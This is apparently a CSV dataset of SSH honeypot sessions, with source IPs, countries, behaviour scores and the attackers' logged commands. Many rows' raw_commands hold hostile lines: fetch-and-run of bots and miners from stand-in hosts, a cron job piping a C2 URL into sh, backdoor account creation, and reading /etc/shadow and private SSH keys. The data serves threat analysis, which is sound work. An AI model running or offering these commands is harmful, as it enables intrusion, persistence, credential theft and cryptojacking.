session_id,src_ip,country,login_attempts,login_success,num_commands,session_duration,dst_port,recon_score,persistence_score,mining_score,lateral_score,exfil_score,has_download,has_chmod,has_cron,has_useradd,raw_commands
4f4e03e1784b4414,104.236.198.48,United States,1,1,3,22,22,2,0,0,0,3,0,0,0,0,cat /etc/shadow cat /etc/passwd tar czf /tmp/data.tgz /home/*
baa41527f04741cc,211.94.20.175,China,1,1,3,12,22,0,2,0,0,0,1,1,0,0,wget http://malicious.ru/bot -O /tmp/bot chmod +x /tmp/bot /tmp/bot &
e4a8639cf9c74b07,80.82.77.139,Netherlands,4,1,5,45,22,5,0,0,0,0,0,0,0,0,uname -a cat /proc/cpuinfo free -m df -h ifconfig
0487e30357e246ea,179.60.150.100,Brazil,5,0,0,12,22,0,0,0,0,0,0,0,0,0,
01e7949ef641473b,91.240.118.172,Ukraine,4,1,2,19,22,0,0,0,2,0,0,0,0,0,nmap -sn 10.0.0.0/24 arp -a
f1b96586b8af4e72,211.94.20.175,China,4,1,1,26,22,0,0,0,3,0,0,0,0,0,for i in $(seq 1 254); do ping -c1 192.168.1.$i; done
78d2c74c51fc4170,206.189.32.177,United States,2,1,2,13,22,1,0,0,1,2,0,0,0,0,find / -name '*.pem' 2>/dev/null find / -name 'id_rsa' 2>/dev/null
0f4cc75365c5418e,185.220.101.45,Germany,3,1,5,34,22,5,0,0,0,0,0,0,0,0,uname -a cat /proc/cpuinfo free -m df -h ifconfig
3307ef93e00345df,45.142.212.100,Netherlands,2,1,3,15,22,1,0,0,3,1,0,0,0,0,cat ~/.ssh/known_hosts cat ~/.ssh/id_rsa ssh-keyscan 192.168.1.0/24
b2607ea336ab4ea3,167.71.13.196,United States,5,0,0,18,22,0,0,0,0,0,0,0,0,0,
74f110a327914ee8,167.71.13.196,United States,5,0,0,12,22,0,0,0,0,0,0,0,0,0,
912766bbbc624454,92.255.57.210,Russia,3,0,0,10,22,0,0,0,0,0,0,0,0,0,
c681be33c01a44e4,167.71.13.196,United States,4,1,1,22,22,0,1,0,0,0,1,0,1,0,echo '* * * * * curl http://bad.actor/c2 | sh' >> /var/spool/cron/root
e2b049fbeb4b4dad,211.94.20.175,China,1,1,2,14,22,0,0,0,2,0,0,0,0,0,nmap -sn 10.0.0.0/24 arp -a
eae6456fb01a4107,92.255.57.210,Russia,5,0,0,17,22,0,0,0,0,0,0,0,0,0,
e3191353880e4a9e,211.94.20.175,China,5,1,3,31,22,0,2,3,0,0,1,1,0,0,wget http://xmrig.onion/xmrig chmod +x xmrig ./xmrig -o pool.minexmr.com:443 -u wallet
ba9a6f02a69a457b,157.245.108.55,United States,5,1,5,29,22,5,0,0,0,0,0,0,0,0,uname -a cat /proc/cpuinfo free -m df -h ifconfig
c1fa9b0701f74889,198.199.65.32,United States,3,0,0,11,22,0,0,0,0,0,0,0,0,0,
e53e8ea5cdb54dc5,206.189.32.177,United States,3,1,3,28,22,2,0,0,0,3,0,0,0,0,cat /etc/shadow cat /etc/passwd tar czf /tmp/data.tgz /home/*
6916f367af8a4b8a,178.128.21.44,Singapore,3,0,0,7,22,0,0,0,0,0,0,0,0,0,
153c1d370b2b4eaa,117.21.191.131,China,5,0,0,16,22,0,0,0,0,0,0,0,0,0,
09d80a2c7141428e,157.245.108.55,United States,4,0,0,14,22,0,0,0,0,0,0,0,0,0,
df1413f97f8b4681,117.21.191.131,China,2,0,0,5,22,0,0,0,0,0,0,0,0,0,
08fffaa5158d4759,198.199.65.32,United States,1,0,0,3,22,0,0,0,0,0,0,0,0,0,
3406787548834ebd,180.129.12.93,China,1,1,2,8,22,1,0,0,1,2,0,0,0,0,find / -name '*.pem' 2>/dev/null find / -name 'id_rsa' 2>/dev/null
5559199f056346d0,167.71.13.196,United States,3,1,5,28,22,6,0,0,0,0,0,0,0,0,uname -a whoami id cat /etc/passwd ls /
05caf312752e4545,185.220.101.45,Germany,3,1,5,32,22,3,0,0,0,0,0,0,0,0,id pwd ls -la cat /etc/issue hostname
45517c7178ef4ad4,179.60.150.100,Brazil,4,1,3,28,22,1,0,0,3,1,0,0,0,0,cat ~/.ssh/known_hosts cat ~/.ssh/id_rsa ssh-keyscan 192.168.1.0/24
7cb0a4a014c64432,103.99.0.122,India,3,0,0,13,22,0,0,0,0,0,0,0,0,0,
df2d7b864d6648a3,103.99.0.122,India,5,0,0,15,22,0,0,0,0,0,0,0,0,0,
04a3a160fc114be0,5.188.86.172,Russia,3,1,1,12,22,0,0,0,3,0,0,0,0,0,for i in $(seq 1 254); do ping -c1 192.168.1.$i; done
e86c5816c18a4efc,134.209.82.19,United States,5,0,0,13,22,0,0,0,0,0,0,0,0,0,
ab67d871dd7d45a2,138.197.148.152,United States,5,1,3,33,22,0,2,3,0,0,1,1,0,0,wget http://xmrig.onion/xmrig chmod +x xmrig ./xmrig -o pool.minexmr.com:443 -u wallet
cde0aa493d59492a,179.60.150.100,Brazil,1,0,0,4,22,0,0,0,0,0,0,0,0,0,
d10ca53e0fa84f90,179.60.150.100,Brazil,3,0,0,12,22,0,0,0,0,0,0,0,0,0,
1bdb761b83214590,92.255.57.210,Russia,5,1,5,33,22,3,0,0,0,0,0,0,0,0,id pwd ls -la cat /etc/issue hostname
76fc4f1de2be4d32,179.60.150.100,Brazil,4,1,5,35,22,3,0,0,0,0,0,0,0,0,id pwd ls -la cat /etc/issue hostname
ada3b2a06ef54517,45.95.147.236,Netherlands,3,1,5,30,22,6,0,0,0,0,0,0,0,0,uname -a whoami id cat /etc/passwd ls /
c579f4cf7bff423d,178.128.21.44,Singapore,1,0,0,6,22,0,0,0,0,0,0,0,0,0,
5671fd6bcbbd4ca7,222.186.15.101,China,4,1,2,18,22,0,0,0,2,0,0,0,0,0,nmap -sn 10.0.0.0/24 arp -a
3a17d49c1b1b4eb8,138.197.148.152,United States,3,1,1,13,22,0,1,0,0,0,1,0,0,0,curl -s http://45.33.32.156/install.sh | bash
0ae903df35d9449a,179.60.150.100,Brazil,3,0,0,12,22,0,0,0,0,0,0,0,0,0,
c7fd62fa79644fc1,159.89.49.114,United States,1,0,0,4,22,0,0,0,0,0,0,0,0,0,
90339c3dd4644db0,193.32.162.8,Russia,1,1,5,31,22,5,0,0,0,0,0,0,0,0,uname -a cat /proc/cpuinfo free -m df -h ifconfig
519258f815be4d55,179.60.150.100,Brazil,3,1,2,18,22,1,0,0,1,2,0,0,0,0,find / -name '*.pem' 2>/dev/null find / -name 'id_rsa' 2>/dev/null
2d09b5ac409941d9,206.189.32.177,United States,3,0,0,8,22,0,0,0,0,0,0,0,0,0,
5c4f4defb2bc4c50,164.92.98.77,United States,2,1,1,9,22,0,0,0,3,0,0,0,0,0,for i in $(seq 1 254); do ping -c1 192.168.1.$i; done
af2a0f7c151c4ac6,134.209.82.19,United States,1,1,1,5,22,0,0,0,3,0,0,0,0,0,for i in $(seq 1 254); do ping -c1 192.168.1.$i; done
c2aed1ad51324152,117.21.191.131,China,3,0,0,10,22,0,0,0,0,0,0,0,0,0,
d1e6665dc32040d4,206.189.32.177,United States,3,1,3,27,22,0,2,3,0,0,1,1,0,0,wget http://xmrig.onion/xmrig chmod +x xmrig ./xmrig -o pool.minexmr.com:443 -u wallet
3aee130fdcb84cbd,157.245.108.55,United States,5,0,0,12,22,0,0,0,0,0,0,0,0,0,
14d1a908749040c4,164.92.98.77,United States,1,1,3,19,22,0,2,3,0,0,1,1,0,0,wget http://xmrig.onion/xmrig chmod +x xmrig ./xmrig -o pool.minexmr.com:443 -u wallet
61d9ddd78d7e4621,179.60.150.100,Brazil,3,1,3,24,22,0,0,0,0,1,0,0,0,0,history cat ~/.bash_history find /var/www -name '*.php' | xargs grep -l password
65e23bee21144d26,117.21.191.131,China,2,1,5,22,22,6,0,0,0,0,0,0,0,0,uname -a whoami id cat /etc/passwd ls /
41df14acefbd42e0,218.92.0.158,China,3,1,2,20,22,0,0,0,2,0,0,0,0,0,nmap -sn 10.0.0.0/24 arp -a
0035097c53b848f3,193.32.162.8,Russia,5,1,2,19,22,1,2,0,0,0,0,0,0,1,useradd -m -s /bin/bash backdoor echo 'backdoor:P@ss123' | chpasswd
080d6f44ac154fa5,206.189.32.177,United States,5,1,1,14,22,0,0,0,3,0,0,0,0,0,for i in $(seq 1 254); do ping -c1 192.168.1.$i; done
dce0d1534b884b40,117.21.191.131,China,5,1,5,45,22,3,0,0,0,0,0,0,0,0,id pwd ls -la cat /etc/issue hostname
0016ab51560c440d,117.21.191.131,China,5,0,0,15,22,0,0,0,0,0,0,0,0,0,
01f8abbdbaad4726,222.186.15.101,China,3,0,0,10,22,0,0,0,0,0,0,0,0,0,
966c075b3ffa48c8,194.165.16.11,Russia,4,0,0,14,22,0,0,0,0,0,0,0,0,0,
9fcd2a4a27634989,117.21.191.131,China,1,1,2,19,22,1,0,0,1,2,0,0,0,0,find / -name '*.pem' 2>/dev/null find / -name 'id_rsa' 2>/dev/null
c6f4a10b9a864566,80.82.77.139,Netherlands,3,0,0,11,22,0,0,0,0,0,0,0,0,0,
911aed12d14c4323,180.129.12.93,China,4,0,0,9,22,0,0,0,0,0,0,0,0,0,
aa12a3b7a9a84805,5.188.86.172,Russia,3,0,0,11,22,0,0,0,0,0,0,0,0,0,
b7ef840dedef4693,194.165.16.11,Russia,2,0,0,7,22,0,0,0,0,0,0,0,0,0,
304821c11ba044d3,138.197.148.152,United States,1,0,0,3,22,0,0,0,0,0,0,0,0,0,
ec7f878c6f664902,58.218.211.36,China,5,0,0,11,22,0,0,0,0,0,0,0,0,0,
a09d1998cdb14612,164.92.98.77,United States,2,0,0,6,22,0,0,0,0,0,0,0,0,0,
c1b88c6da82b4aad,68.183.39.102,United States,5,1,3,25,22,2,0,0,0,3,0,0,0,0,cat /etc/shadow cat /etc/passwd tar czf /tmp/data.tgz /home/*
656e8c28edca440e,138.197.148.152,United States,3,1,5,34,22,3,0,0,0,0,0,0,0,0,id pwd ls -la cat /etc/issue hostname
ba4a07e941394cad,159.89.49.114,United States,1,1,2,13,22,1,0,0,1,2,0,0,0,0,find / -name '*.pem' 2>/dev/null find / -name 'id_rsa' 2>/dev/null
1d2101a1b0d64e7a,91.240.118.172,Ukraine,2,1,2,16,22,1,2,0,0,0,0,0,0,1,useradd -m -s /bin/bash backdoor echo 'backdoor:P@ss123' | chpasswd
cd6f187866274549,178.128.21.44,Singapore,5,0,0,16,22,0,0,0,0,0,0,0,0,0,
c0490800bcf94465,117.21.191.131,China,3,0,0,12,22,0,0,0,0,0,0,0,0,0,
a1eeeab958ed4df4,91.240.118.172,Ukraine,5,1,3,22,22,1,0,0,3,1,0,0,0,0,cat ~/.ssh/known_hosts cat ~/.ssh/id_rsa ssh-keyscan 192.168.1.0/24
244f667e609f41a5,45.142.212.100,Netherlands,2,0,0,5,22,0,0,0,0,0,0,0,0,0,
a8d59116af3e4eb3,103.99.0.122,India,1,0,0,3,22,0,0,0,0,0,0,0,0,0,
2f0b5e189fb54ca4,68.183.39.102,United States,3,1,5,25,22,6,0,0,0,0,0,0,0,0,uname -a whoami id cat /etc/passwd ls /
6143bca29125421a,138.197.148.152,United States,3,1,1,9,22,0,1,0,0,0,1,0,1,0,echo '* * * * * curl http://bad.actor/c2 | sh' >> /var/spool/cron/root
e9758b613c8b4c81,164.92.98.77,United States,4,1,1,12,22,0,0,0,3,0,0,0,0,0,for i in $(seq 1 254); do ping -c1 192.168.1.$i; done
4f768a05221c4e82,91.240.118.172,Ukraine,1,0,0,4,22,0,0,0,0,0,0,0,0,0,
801bb1b6b0654435,198.199.65.32,United States,3,1,3,15,22,2,0,0,0,3,0,0,0,0,cat /etc/shadow cat /etc/passwd tar czf /tmp/data.tgz /home/*
f3f4315925754aea,45.142.212.100,Netherlands,5,1,2,22,22,1,2,0,0,0,0,0,0,1,useradd -m -s /bin/bash backdoor echo 'backdoor:P@ss123' | chpasswd
5f3edda98f634708,80.82.77.139,Netherlands,5,1,1,21,22,0,1,0,0,0,1,0,1,0,echo '* * * * * curl http://bad.actor/c2 | sh' >> /var/spool/cron/root
044a3266781f4e18,164.92.98.77,United States,3,0,0,11,22,0,0,0,0,0,0,0,0,0,
a23c80f11f98465e,157.245.108.55,United States,2,0,0,8,22,0,0,0,0,0,0,0,0,0,
22e5983dbfd64290,138.197.148.152,United States,1,1,1,12,22,0,0,0,3,0,0,0,0,0,for i in $(seq 1 254); do ping -c1 192.168.1.$i; done
ccfe5fe24bd04343,198.199.65.32,United States,2,1,2,17,22,1,0,0,1,2,0,0,0,0,find / -name '*.pem' 2>/dev/null find / -name 'id_rsa' 2>/dev/null
b96fbedb6eba4a02,134.209.82.19,United States,5,0,0,19,22,0,0,0,0,0,0,0,0,0,
ebe59d567b5145ba,91.240.118.172,Ukraine,1,0,0,6,22,0,0,0,0,0,0,0,0,0,
66d0a1e8eb9545a1,206.189.32.177,United States,2,1,1,13,22,0,1,0,0,0,1,0,0,0,curl -s http://45.33.32.156/install.sh | bash
45490a32144445f3,193.32.162.8,Russia,4,0,0,17,22,0,0,0,0,0,0,0,0,0,
8d969021a7de41fb,193.32.162.8,Russia,2,0,0,8,22,0,0,0,0,0,0,0,0,0,
738b9a59ea9d4bb6,180.129.12.93,China,2,0,0,7,22,0,0,0,0,0,0,0,0,0,
9a81ced07ba14016,206.189.32.177,United States,3,1,3,20,22,2,0,0,0,3,0,0,0,0,cat /etc/shadow cat /etc/passwd tar czf /tmp/data.tgz /home/*
413c7847e081483d,134.209.82.19,United States,1,1,3,13,22,1,0,0,3,1,0,0,0,0,cat ~/.ssh/known_hosts cat ~/.ssh/id_rsa ssh-keyscan 192.168.1.0/24
7a33412941204eb2,104.236.198.48,United States,2,0,0,6,22,0,0,0,0,0,0,0,0,0,
b19a533cde4e4fe6,58.218.211.36,China,5,1,5,46,22,5,0,0,0,0,0,0,0,0,uname -a cat /proc/cpuinfo free -m df -h ifconfig
171143c597564c08,117.21.191.131,China,2,0,0,4,22,0,0,0,0,0,0,0,0,0,
84b8f112880a4aeb,92.255.57.210,Russia,2,1,2,15,22,1,2,0,0,0,0,0,0,1,useradd -m -s /bin/bash backdoor echo 'backdoor:P@ss123' | chpasswd
00d51fd8202f4b27,198.199.65.32,United States,3,0,0,12,22,0,0,0,0,0,0,0,0,0,
3edcf2c9211346d4,164.92.98.77,United States,2,1,3,28,22,2,0,0,0,3,0,0,0,0,cat /etc/shadow cat /etc/passwd tar czf /tmp/data.tgz /home/*
41a0161995404e29,194.165.16.11,Russia,4,0,0,17,22,0,0,0,0,0,0,0,0,0,
5d7eb1828658425a,138.197.148.152,United States,2,1,5,35,22,5,0,0,0,0,0,0,0,0,uname -a cat /proc/cpuinfo free -m df -h ifconfig
973ddaae6abf469f,222.186.15.101,China,1,0,0,5,22,0,0,0,0,0,0,0,0,0,
238f8bfa75da4153,5.188.86.172,Russia,1,1,1,9,22,0,1,0,0,0,1,0,0,0,curl -s http://45.33.32.156/install.sh | bash
c737cc683f61437e,206.189.32.177,United States,1,0,0,6,22,0,0,0,0,0,0,0,0,0,
ea5e231ab0e14c3a,194.165.16.11,Russia,5,1,3,25,22,0,0,0,0,1,0,0,0,0,history cat ~/.bash_history find /var/www -name '*.php' | xargs grep -l password
499a2da64aed4167,179.60.150.100,Brazil,5,1,2,31,22,0,0,0,2,0,0,0,0,0,nmap -sn 10.0.0.0/24 arp -a
22ae61783e5c45db,138.197.148.152,United States,4,0,0,11,22,0,0,0,0,0,0,0,0,0,
e3f865127662460a,92.255.57.210,Russia,3,0,0,7,22,0,0,0,0,0,0,0,0,0,
cb8e26b275f04935,198.199.65.32,United States,5,0,0,17,22,0,0,0,0,0,0,0,0,0,
ab24894e82984183,167.71.13.196,United States,4,0,0,15,22,0,0,0,0,0,0,0,0,0,
979903c3cf444c70,222.186.15.101,China,5,1,3,21,22,1,0,0,3,1,0,0,0,0,cat ~/.ssh/known_hosts cat ~/.ssh/id_rsa ssh-keyscan 192.168.1.0/24
3c73351bcd9143ed,45.95.147.236,Netherlands,4,1,5,34,22,3,0,0,0,0,0,0,0,0,id pwd ls -la cat /etc/issue hostname
20d62d9e1c4a4b43,104.236.198.48,United States,4,0,0,12,22,0,0,0,0,0,0,0,0,0,
c7ab7f656f7a41fe,179.60.150.100,Brazil,1,0,0,3,22,0,0,0,0,0,0,0,0,0,
5370277303e242ae,80.82.77.139,Netherlands,5,1,3,22,22,0,2,3,0,0,1,1,0,0,wget http://xmrig.onion/xmrig chmod +x xmrig ./xmrig -o pool.minexmr.com:443 -u wallet
06fcc33b1e854043,211.94.20.175,China,3,0,0,9,22,0,0,0,0,0,0,0,0,0,
a3ad4b645a4147ed,138.197.148.152,United States,5,1,2,20,22,0,0,0,2,0,0,0,0,0,nmap -sn 10.0.0.0/24 arp -a
39ec2c04bdca4e89,178.128.21.44,Singapore,3,1,3,20,22,0,0,0,0,1,0,0,0,0,history cat ~/.bash_history find /var/www -name '*.php' | xargs grep -l password
8b5cc8d6f0884271,222.186.15.101,China,4,1,3,27,22,0,2,3,0,0,1,1,0,0,wget http://xmrig.onion/xmrig chmod +x xmrig ./xmrig -o pool.minexmr.com:443 -u wallet
3d0c9556a4994766,164.92.98.77,United States,4,1,3,27,22,0,2,0,0,0,1,1,0,0,wget http://malicious.ru/bot -O /tmp/bot chmod +x /tmp/bot /tmp/bot &
a8da5ebf97bf4697,222.186.15.101,China,5,1,5,30,22,5,0,0,0,0,0,0,0,0,uname -a cat /proc/cpuinfo free -m df -h ifconfig
d464c4f5ec8b4a3f,211.94.20.175,China,1,1,3,11,22,0,0,0,0,1,0,0,0,0,history cat ~/.bash_history find /var/www -name '*.php' | xargs grep -l password
e43a9956661c4c57,45.142.212.100,Netherlands,5,1,2,15,22,1,0,0,1,2,0,0,0,0,find / -name '*.pem' 2>/dev/null find / -name 'id_rsa' 2>/dev/null
5c6a475b218f4aeb,117.21.191.131,China,2,0,0,6,22,0,0,0,0,0,0,0,0,0,
5d30b2231c404434,68.183.39.102,United States,4,1,5,42,22,5,0,0,0,0,0,0,0,0,uname -a cat /proc/cpuinfo free -m df -h ifconfig
058ea00a332e482b,178.128.21.44,Singapore,3,1,1,16,22,0,1,0,0,0,1,0,1,0,echo '* * * * * curl http://bad.actor/c2 | sh' >> /var/spool/cron/root
9e399d3b1c064073,211.94.20.175,China,3,0,0,13,22,0,0,0,0,0,0,0,0,0,
48870e2d2a4c4e0a,45.142.212.100,Netherlands,3,0,0,10,22,0,0,0,0,0,0,0,0,0,
8cb4920bfe7741a7,159.89.49.114,United States,1,0,0,3,22,0,0,0,0,0,0,0,0,0,
6a9745de8e414c02,92.255.57.210,Russia,1,1,1,6,22,0,1,0,0,0,1,0,1,0,echo '* * * * * curl http://bad.actor/c2 | sh' >> /var/spool/cron/root
a3effc2445454242,80.82.77.139,Netherlands,4,0,0,11,22,0,0,0,0,0,0,0,0,0,
7735b4b14a554aa9,193.32.162.8,Russia,4,0,0,10,22,0,0,0,0,0,0,0,0,0,
47fe64430bf948d8,206.189.32.177,United States,1,0,0,4,22,0,0,0,0,0,0,0,0,0,
02b097aa1d0e43de,167.71.13.196,United States,5,0,0,14,22,0,0,0,0,0,0,0,0,0,
956116d37ef7415d,58.218.211.36,China,1,0,0,4,22,0,0,0,0,0,0,0,0,0,
aaa720a93cc24c31,91.240.118.172,Ukraine,1,1,2,18,22,0,1,1,0,0,1,0,0,0,curl http://mining.pool/miner.sh -o /tmp/.x bash /tmp/.x
53a19fc9833c40d7,159.89.49.114,United States,1,1,3,18,22,0,2,3,0,0,1,1,0,0,wget http://xmrig.onion/xmrig chmod +x xmrig ./xmrig -o pool.minexmr.com:443 -u wallet
b73bbaaab74c4104,180.129.12.93,China,2,1,3,22,22,0,0,0,0,1,0,0,0,0,history cat ~/.bash_history find /var/www -name '*.php' | xargs grep -l password
f15862a587cb46db,179.60.150.100,Brazil,4,0,0,16,22,0,0,0,0,0,0,0,0,0,
3b0a91eb3ddc4199,185.220.101.45,Germany,1,1,1,10,22,0,1,0,0,0,1,0,1,0,echo '* * * * * curl http://bad.actor/c2 | sh' >> /var/spool/cron/root
cfb925d5f65c4401,58.218.211.36,China,3,1,5,35,22,6,0,0,0,0,0,0,0,0,uname -a whoami id cat /etc/passwd ls /
6d723c7dfbd74169,178.128.21.44,Singapore,1,1,2,11,22,0,0,0,2,0,0,0,0,0,nmap -sn 10.0.0.0/24 arp -a
9cdd12e1c7384a1b,178.128.21.44,Singapore,4,0,0,10,22,0,0,0,0,0,0,0,0,0,
c8f727c376bd4354,180.129.12.93,China,3,0,0,9,22,0,0,0,0,0,0,0,0,0,
3f69b1d54bae46cb,68.183.39.102,United States,2,1,2,18,22,0,0,0,2,0,0,0,0,0,nmap -sn 10.0.0.0/24 arp -a
018947b8e9b341f7,178.128.21.44,Singapore,4,1,2,27,22,1,0,0,1,2,0,0,0,0,find / -name '*.pem' 2>/dev/null find / -name 'id_rsa' 2>/dev/null
